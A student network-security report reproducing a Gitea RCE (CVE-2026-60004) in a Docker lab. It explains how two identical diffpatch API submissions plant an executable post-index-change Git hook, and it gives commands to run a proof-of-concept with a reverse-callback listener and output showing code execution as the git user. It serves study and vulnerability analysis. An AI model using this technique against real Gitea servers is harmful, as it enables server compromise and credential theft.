# Network Security Term Project Report

**Name**: Student  
**Student ID**: [STUDENT_ID]

---

## I. CVE Vulnerability Information

### 1. CVE ID and Publication Date
- **CVE ID**: CVE-2026-60004 [1]
- **Publication Date**: 2026-08-26

### 2. CVSS Score and Vector
- **CVSS Version / Score**: CVSS v3.1 / 9.8 (Critical)
- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Scoring Source**: GitHub Security Advisory (GHSA-rcr6-4jqh-j84m) [2]

### 3. Affected Software or Components
- **Software Name**: Gitea
- **Vulnerable Versions**: `>= 1.17.0, < 1.27.1` [2]
- **Version Used in Experiment**: `1.27.0`

### 4. Vulnerable Environment
- **Operating System**: Linux / Unix-like systems
- **Dependencies**: Git `>= 2.32`
- **Deployment Conditions**:
  - Exposed `diffpatch` API endpoint (`/api/v1/repos/{owner}/{repo}/diffpatch`).
  - Writable temporary repository directory mounted without `noexec`.
  - Account with repository write access (or open self-registration enabled by default).

### 5. Vulnerability Type and Root Cause
- **Vulnerability Type**: CWE-94 (Improper Control of Generation of Code / Code Injection) [1, 2, 3]
- **Root Cause**: In `ApplyDiffPatch()` (`services/repository/files/patch.go`), Gitea stages patches inside a temporary bare clone (`git clone --shared --bare`) using `git apply --cached --recount -3`. Submitting a new-file patch (`hooks/post-index-change`, mode `100755`) once commits the path into the target branch's Git tree in memory. Submitting the identical patch a second time against that branch triggers an add/add conflict where Git's `-3` (3-way merge) resolution writes the merged file directly to disk despite `--cached`. Because a bare clone's root directory is `$GIT_DIR`, writing to `hooks/post-index-change` installs a live Git hook that executes immediately when Git writes the updated index [2].

### 6. Trigger Conditions and Attack Prerequisites
- **Required Privileges**: Repository write access (effectively unauthenticated when public self-registration is enabled).
- **Network / Input**: Two sequential HTTP `POST` requests to the `diffpatch` API submitting the identical unified diff creating `hooks/post-index-change` with mode `100755`.
- **User Interaction**: None.

### 7. Impact of Successful Exploitation
Remote Code Execution (RCE) with the privileges of the Gitea service user (`git`), permitting unauthorized access to repositories, server configuration, credentials, and full container/server compromise [2, 5].

---

## II. Experimental Setup

### 1. Operating System
- **Host OS**: Ubuntu 26.04.1 LTS (`x86_64`) on Linux Kernel `6.18.33.2-microsoft-standard-WSL2`
- **Container Base**: Alpine Linux v3.24 (`3.24.1`, `x86_64`) (Official Gitea Docker Image)

### 2. Software / Component Versions
- **Vulnerable Application**: Gitea `1.27.0` (compiled with Go `1.26.5`)
- **Git Binary**: Git version `2.54.0`
- **Container Engine**: Docker Engine `29.9.1`, Docker Compose `v5.6.0`
- **Verification Environment**: Python `3.14.4` (`requests 2.32.5`), Bash, Netcat (BusyBox `v1.37.0`)

### 3. Required Dependencies
- Docker Engine and Docker Compose plugin (`docker compose`)
- Python 3 with `requests` library (`pip install -r poc/requirements.txt`)

### 4. Network / Deployment Configuration
- **Container Network**: Docker Compose bridge (`172.20.0.0/16` in test environment)
- **Port Mapping**: `3000:3000` (Gitea HTTP Web UI and REST API)
- **Database**: Embedded SQLite3 at `/data/gitea/gitea.db`

### 5. Other Relevant Settings
- `GITEA__security__INSTALL_LOCK=true`: Bypasses initial setup wizard.
- `GITEA__database__DB_TYPE=sqlite3`: Configures standalone lightweight database.
- `gitea-init` one-shot service: Idempotently seeds baseline account `dev` and initialized repository `dev/project` via Gitea's HTTP endpoints for deterministic automated testing.
- Default Gitea configuration keeps open self-registration enabled (`DISABLE_REGISTRATION = false`), supporting zero-credential reproduction as well.

---

## III. Reproduction Evidence / Failure Analysis

### 1. Reproduction Steps
1. **Start Environment**:
   ```bash
   docker compose up -d
   ```
2. **Execute Automated Verification & Boundary Matrix**:
   ```bash
   ./test.sh
   python3 poc/matrix_test.py --url http://localhost:3000
   ```
   *(Optional interactive callback verification)*:
   ```bash
   GATEWAY_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' gitea-cve-2026-60004)"
   python3 poc/exploit.py --url http://localhost:3000 --lhost "${GATEWAY_IP}" --lport 4444
   ```
   *Execution Flow*:
   - Authenticates using pre-seeded test credentials (`dev` / `dev/project` in `./test.sh`), or automatically self-registers a fresh user and repository when credentials are omitted.
   - Cleans `hooks/post-index-change` on the target branch if present from prior runs to guarantee idempotency.
   - Dispatches Stage 1 patch adding `hooks/post-index-change` (`100755`) into the branch's Git index/tree.
   - Dispatches Stage 2 duplicate patch, inducing the add/add 3-way merge write onto `$GIT_DIR/hooks/post-index-change`.
   - Subsequent index write immediately triggers `post-index-change`, executing the command under the `git` user.

### 2. Discussion

#### ➢ Success:
The reproduction was verified with deterministic reliability across both pre-provisioned authenticated repositories and zero-credential self-registered accounts. When duplicate patches targeting `hooks/post-index-change` were dispatched to the `diffpatch` API, Git's 3-way merge resolution dropped the executable hook into `/data/gitea/tmp/local-repo/upload.git<id>/hooks/post-index-change`. Immediately upon writing the updated index, Git executed the client-side hook, yielding remote command execution as user `git` (`uid=1000, gid=1000`).

#### ➢ Controlled Variable & Architectural Boundary Analysis:
Rather than treating the vulnerability as a simple black-box web flaw, we empirically mapped the system boundary conditions across 4 distinct test permutations (`poc/matrix_test.py`):

| Case | Test Condition | Target File Path | Repetitions | HTTP Statuses | Execution Result | Root Cause Analysis |
| :---: | :--- | :--- | :---: | :---: | :---: | :--- |
| **1** | **Single Patch Isolation** | `hooks/post-index-change` | 1x | `[201]` | ❌ FAILED | Git's `--cached` flag maintained in-memory isolation. No add/add conflict occurred; zero disk writes. |
| **2** | **Pre-existing File Vector** | `config` | 2x | `[201, 500]` | ❌ FAILED | 3-way merge aborted (`error: config: does not match index`). Pre-existing `$GIT_DIR` files on disk cannot be overwritten. |
| **3** | **Inapplicable Lifecycle Hook** | `hooks/pre-commit` | 2x | `[201, 201]` | ❌ FAILED | File dropped onto disk via conflict, but Gitea's plumbing-based index/tree commits do not invoke interactive `pre-commit` hooks. |
| **4** | **Target Exploit Condition** | `hooks/post-index-change` | 2x | `[201, 201]` | ✅ **SUCCESS** | Add/add conflict forced Git's `-3` merge output to disk. Writing the updated index immediately executed `post-index-change`. |

This proves that exploitation requires the precise convergence of: (1) an add/add collision with no common ancestor, (2) a target path initially absent from `$GIT_DIR` on disk so Git's worktree-to-index verification passes, and (3) an index-level client hook (`post-index-change`) that Git unconditionally invokes upon index writes.

#### ➢ Failure / Negative Findings:
Attempting to overwrite existing `$GIT_DIR` metadata files on disk such as `config` (Case 2) resulted in an internal server error (`HTTP 500`) on the second patch with Git error: `error: config: does not match index` / `error: cannot read the current contents of 'config'`. Because `$GIT_DIR/config` already exists on disk in the bare temporary clone and differs from the staged index blob committed in Stage 1, Git refuses to overwrite it. This eliminates arbitrary overwrite of pre-existing `$GIT_DIR` configuration files and explains why exploitation specifically targets `hooks/post-index-change` (where only `*.sample` hook files exist on disk by default).

### 3. Evidence

#### Terminal Output (`./test.sh`):
```text
[*] Ensuring target container is running...
[*] Waiting for target repository (dev/project) to be ready...
[*] Target version info:
gitea version 1.27.0 built with go1.26.5-X:jsonv2 : bindata, timetzdata, 
git version 2.54.0
[*] Running verification PoC with pre-configured environment credentials...
[*] Target URL: http://localhost:3000
[*] Using existing account credentials: dev
[+] Authenticated successfully as 'dev'.
[*] Using target repository: project
[+] Target repo verified (default branch: 'main').
[*] Stage 1: Sending initial patch...
[*] Stage 2: Triggering add/add conflict to install hook...
[+] Exploit completed: 'hooks/post-index-change' installed and triggered!
[*] Verification output from container (/tmp/pwned.txt):
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
Linux 233fe2e85e2f 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 Linux
```

---

## IV. References

### 1. Sources
- [1] CVE Record: https://www.cve.org/CVERecord?id=CVE-2026-60004
- [2] GitHub Advisory: https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m
- [3] NVD Record: https://nvd.nist.gov/vuln/detail/cve-2026-60004
- [4] Gitea diffpatch API Docs: https://docs.gitea.com/api/next/operations/repo-apply-diff-patch
- [5] RunZero Research: https://www.runzero.com/blog/gitea/

### 2. LLM Usage Statement
- **Tools and Models**: Gemini Web Chat (Gemini 3.8 Flash, Gemini 4 Argon), Antigravity Agent
- **Usage**:
  1. Refining report structure and English wording.
  2. Synthesizing reproduction steps and evidence formatting.
  3. Auditing configuration, fixing flaws, and cleaning code.
- **Verification**: Manually ran all code and commands against the local Docker container, verifying output, container environment versions, and technical accuracy against official advisory GHSA-rcr6-4jqh-j84m.
